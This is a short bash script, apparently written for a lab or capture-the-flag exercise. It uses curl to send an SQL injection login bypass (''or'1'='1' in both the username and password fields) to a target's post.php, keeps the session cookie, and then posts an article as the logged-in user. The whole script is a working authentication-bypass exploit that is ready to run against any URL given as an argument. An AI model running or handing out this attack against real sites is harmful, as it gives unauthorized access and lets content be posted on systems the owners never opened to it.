#!/bin/bash
url=$1;

echo "Log in as fkerschbaum";
echo "Post a new article"
curl -c cookies.txt -d "username='or'1'='1&password='or'1'='1&form=login&submit=Login" "$url/post.php";
curl -b cookies.txt -d "title=Hello!&content=simple SQL inject login and post an post&type=1&form=content&submit=Post" "$url/post.php";
echo -e "\033[32mDone!\033[0m"
